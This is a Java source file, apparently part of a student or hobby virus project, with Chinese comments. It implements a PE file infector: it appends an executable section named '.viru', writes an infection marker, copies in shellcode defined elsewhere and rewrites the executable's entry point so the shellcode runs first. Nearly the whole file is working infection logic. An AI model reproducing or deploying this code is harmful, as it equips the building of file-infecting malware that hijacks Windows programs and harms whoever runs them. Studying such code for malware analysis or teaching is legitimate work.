/*
 * @Descripttion: your project
 * @version: 1.0
 * @Author: Yhank
 * @Date: 2021-10-29 09:06:48
 * @LastEditors: Yhank
 * @LastEditTime: 2021-11-01 22:06:42
 */
package InjectModule;

import java.util.ArrayList;
import java.io.*;

public class InjecterB extends AbstractInjecter {
    // 采用建立新节注入的方式
    long newSectionHeaderOffset = -1; // 新节头文件偏移
    long newSectionStartRawOffset = -1; // 新节文件偏移
    long newSectionStartRva = -1; // 新节rva偏移
    long fileHeaderOffset = -1;
    long fileAlignment = -1; // 文件对齐粒度
    long newSectionRawSize = -1;
    long newSectionMisc = -1;
    long aOEPSizeOfImage = -1;
    long sizeOfImage = -1;

    final long IMAGE_SCN_MEM_READ = 0x40000000;
    final long IMAGE_SCN_MEM_EXECUTE = 0x20000000;
    final long IMAGE_SCN_MEM_CODE = 0x00000020;

    ArrayList<Byte> newSectionHeader = new ArrayList<>();

    public InjecterB(String filePath, long fileAlignment, long aOEPRawStore, long addressOfEntryPointRVA,
            long fileHeaderOffset, long aOEPSizeOfImage, long sizeOfImage, long newSectionHeaderOffset,
            long newSectionStartRawOffset, long newSectionStartRva) {

        super(filePath, aOEPRawStore, addressOfEntryPointRVA);
        this.fileAlignment = fileAlignment;
        this.fileHeaderOffset = fileHeaderOffset;
        this.newSectionHeaderOffset = newSectionHeaderOffset;
        this.newSectionStartRawOffset = newSectionStartRawOffset;
        this.newSectionStartRva = newSectionStartRva;
        this.aOEPSizeOfImage = aOEPSizeOfImage;
        this.sizeOfImage = sizeOfImage;
        buildNewSectionHeader();
    }

    void buildNewSectionHeader() {
        byte[] name = getStandardName(".viru"); // 这里先随便起了
        long Misc = shellCode.length + 8; // 节实际长度
        long VirtualAddress = newSectionStartRva;
        long sizeOfRawData = ((long) (Math.ceil((double) Misc / (double) fileAlignment))) * fileAlignment;
        long pointToRawData = newSectionStartRawOffset;
        long pointToRelocations = 0;
        long pointToLinenumbers = 0;
        long numberOfRelocations = 0;
        long numberOfLinenumbers = 0;
        long characteristics = IMAGE_SCN_MEM_CODE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;

        newSectionRawSize = sizeOfRawData; // 由于后面要用到这里保存一下
        newSectionMisc = Misc;             // 同样
        // 给新节头添加数据
        addSingleAttrByByteList(name, 8);
        addSingle4ByteAttr(Misc);
        addSingle4ByteAttr(VirtualAddress);
        addSingle4ByteAttr(sizeOfRawData);
        addSingle4ByteAttr(pointToRawData);
        addSingle4ByteAttr(pointToRelocations);
        addSingle4ByteAttr(pointToLinenumbers);
        addSingle2ByteAttr(numberOfRelocations);
        addSingle2ByteAttr(numberOfLinenumbers);
        addSingle4ByteAttr(characteristics);
    }

    byte[] getStandardName(String sectionName) {
        // 得到规范化的节名
        byte[] ret = new byte[8];
        byte[] strByteList = sectionName.getBytes(); // 字符串转byte
        for (int i = 0; i < 7; i++) {
            // 留一位置0
            ret[i] = strByteList[i];
            if (i == strByteList.length - 1)
                break;
        }
        ret[7] = 0;
        return ret;
    }

    void addSingle4ByteAttr(long inputAttr) {
        byte[] byteBuf = uf.back4Byte(inputAttr);
        addSingleAttrByByteList(byteBuf, 4);
    }

    void addSingle2ByteAttr(long inputAttr) {
        byte[] byteBuf = uf.back2Byte(inputAttr);
        addSingleAttrByByteList(byteBuf, 2);
    }

    void addSingleAttrByByteList(byte[] inputList, int n) {
        for (int i = 0; i < n; i++) {
            newSectionHeader.add(inputList[i]);
        }
    }

    public int inject() {
        int ret = 0;

        try {
            long shellCodeStartRawOffset = newSectionStartRawOffset + 0x8;
            long shellCodeStartRva = newSectionStartRva + 0x8;
            RandomAccessFile raf = new RandomAccessFile(filePath, "rw");

            // 修改fileHeader
            byte[] readBuf0 = new byte[2];
            raf.seek(fileHeaderOffset + 0x2);
            raf.read(readBuf0);
            long oldSectionNum = uf.trans2Byte(readBuf0);
            long newSectionNum = oldSectionNum + 1;
            byte[] writeBuf0 = uf.back2Byte(newSectionNum);
            raf.seek(fileHeaderOffset + 0x2);
            raf.write(writeBuf0);

            // 写入新节头
            for (int i = 0; i < newSectionHeader.size(); i++) {
                raf.seek(newSectionHeaderOffset + i);
                raf.write(newSectionHeader.get(i));
            }

            // 写已经注入标志
            raf.seek(newSectionStartRawOffset + 0x4);
            raf.write(isInfectedSignture);

            // 改addressOfEntryPoint
            raf.seek(aOEPRawStore);
            raf.write(uf.back4Byte(shellCodeStartRva));

            // 写入新节数据，即写入shellCode
            for (int i = 0; i < shellCode.length; i++) {
                raf.seek(shellCodeStartRawOffset + i);
                raf.write((byte) (shellCode[i]));
            }

            // 补全新节剩下的数据，即补0，假如文件大小不对齐会导致程序无法运行
            long leafSpace = newSectionRawSize - 0x8 - shellCode.length;
            for (int i = 0; i < leafSpace; i++) {
                raf.seek(shellCodeStartRawOffset + shellCode.length + i);
                raf.write((byte) 0x00);
            }

            // 修改optionheader 里的sizeOfImage否则会出错
            long addNewImageSize = uf.simpleCeil(newSectionMisc, (long)0x1000);
            long newSizeOfImage = sizeOfImage + addNewImageSize;
            byte[] writeBuf2 = uf.back4Byte(newSizeOfImage);
            raf.seek(aOEPSizeOfImage);
            raf.write(writeBuf2);

            raf.close();
        } catch (IOException e) {
            e.printStackTrace();
            return -1;
        }

        return ret;
    }

}
/*
 * @Descripttion: your project
 * 
 * @version: 1.0
 * 
 * @Author: Yhank
 * 
 * @Date: 2021-10-29 09:06:48
 * 
 * @LastEditors: Yhank
 * 
 * @LastEditTime: 2021-10-29 09:22:04
 */
